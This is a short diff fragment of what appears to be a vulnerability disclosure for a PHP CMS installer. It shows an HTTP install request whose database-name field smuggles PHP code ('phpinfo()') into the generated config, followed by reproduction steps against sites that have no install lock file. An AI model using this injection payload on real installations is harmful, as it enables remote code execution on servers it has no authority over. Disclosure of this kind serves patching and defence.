@@ -44,6 +44,7 @@ Connection: close
 
 is_form=1&is_admin=0&is_tips=&csrf_test_name=9e9016fb5bc3f485a8e925a7c5c91234&data%5Bname%5D=%E6%88%91%E7%9A%84%E9%A1%B9%E7%9B%AE&data%5Bemail%5D=admin%40admin.com&data%5Busername%5D=admin&data%5Bpassword%5D=admin&data%5Bdb_host%5D=127.0.0.1&data%5Bdb_user%5D=root&data%5Bdb_pass%5D=123456&data%5Bdb_name%5D=ee5%3B--+---'%5D%3Bphpinfo()%3B%5B'&data%5Bdb_prefix%5D=dr_&is_install_db=1
 ```
+
 ##Reproduce the Issue:
 1.Remotely connect to the attacker's database.
 2.The other party did not install the CMS, and did not generate the lock file.
